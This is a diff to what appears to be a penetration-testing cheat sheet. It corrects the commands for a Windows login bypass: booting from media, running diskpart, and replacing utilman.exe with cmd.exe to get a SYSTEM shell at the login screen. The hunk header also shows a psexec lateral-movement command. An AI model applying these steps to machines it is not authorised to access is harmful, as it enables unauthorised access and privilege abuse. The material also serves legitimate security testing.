@@ -1302,12 +1302,12 @@ python psexec.py <domain_name>/<user_name>@<remote_hostname> -k -no-pass
   ### Insert bootable media, shift F1 for cmd (If no bitlocker)
   #### List disks for which to use
   ```cmd
-  diskaprt
+  diskpart
   ```
   #### Replace utilman with cmd
   ```cmd
-  ren utilman.exe utilman.exe.back
-  cope cmd.exe utilman.exe 
+  ren C:\Windows\System32\utilman.exe utilman.exe.bak   
+  copy C:\Windows\System32\cmd.exe C:\Windows\System32\utilman.exe   
   ```
   #### Restart PC and open utility in login screen
   
